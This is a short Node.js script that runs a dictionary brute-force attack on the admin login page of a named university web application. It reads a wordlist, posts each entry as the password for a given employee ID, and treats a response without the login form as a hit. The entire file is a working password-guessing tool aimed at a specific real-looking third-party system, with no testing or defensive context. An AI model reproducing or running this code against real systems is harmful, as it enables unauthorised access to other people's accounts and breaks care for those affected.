//Dependencies
const Request = require("request")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

//Main
if(!Self_Args.length){
    console.log("node index.js <employee_id> <dictionary>")
    process.exit()
}

if(!Self_Args[0]){
    console.log("Invalid employee_id.")
    process.exit()
}

if(!Self_Args[1]){
    console.log("Invalid dictionary.")
    process.exit()
}

if(!Fs.existsSync(Self_Args[1])){
    console.log("Invalid dictionary.")
    process.exit()
}

const dictionary_data = Fs.readFileSync(Self_Args[1], "utf8").split("\n")

if(!dictionary_data){
    console.log("Dictionary data is empty.")
    process.exit()
}

var dictionary_index = 0

Check()
function Check(){
    console.log(Self_Args[0])
    if(dictionary_index == dictionary_data.length){
        console.log("Finished bruteforcing.")
        process.exit()
    }

    Request.post("http://apps.usls.edu.ph/admin/index.php/account/login/index", {
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `emp_id=${Self_Args[0]}&password=${dictionary_data[dictionary_index]}&login=1`
    }, function(err, res, body){
        if(body.indexOf('<div class="login-form-wrapper">') == -1){
            console.log(`Valid password ${dictionary_data[dictionary_index]}`)
        }else{
            console.log(`Invalid password ${dictionary_data[dictionary_index]}`)
        }

        dictionary_index += 1
        Check()
    })
}
